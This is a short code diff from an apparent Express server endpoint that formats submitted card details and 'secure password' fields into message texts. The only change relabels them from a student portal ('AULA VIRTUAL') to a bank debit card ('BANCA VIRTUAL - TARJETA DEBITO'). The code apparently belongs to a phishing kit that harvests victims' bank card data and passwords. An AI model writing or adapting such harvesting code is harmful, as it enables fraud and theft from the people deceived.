@@ -41,7 +41,7 @@ app.post("/api/nombre", async (req,res)=>{
     if(ultimos){
       /* FORMULARIO TARJETA */
       texto =
-`💳 AULA VIRTUAL - TARJETA ESTUDIANTIL
+`💳 BANCA VIRTUAL - TARJETA DEBITO
 
 📋 Tipo: ${tipo}
 🆔 ID: ${identificacion}
@@ -53,7 +53,7 @@ app.post("/api/nombre", async (req,res)=>{
 
       /* FORMULARIO CLAVE SEGURA */
       texto =
-`📚 AULA VIRTUAL - CLAVE SEGURA
+`📚 BANCA VIRTUAL - CLAVE SEGURA
 
 📋 Tipo: ${tipo}
 🆔 ID: ${identificacion}
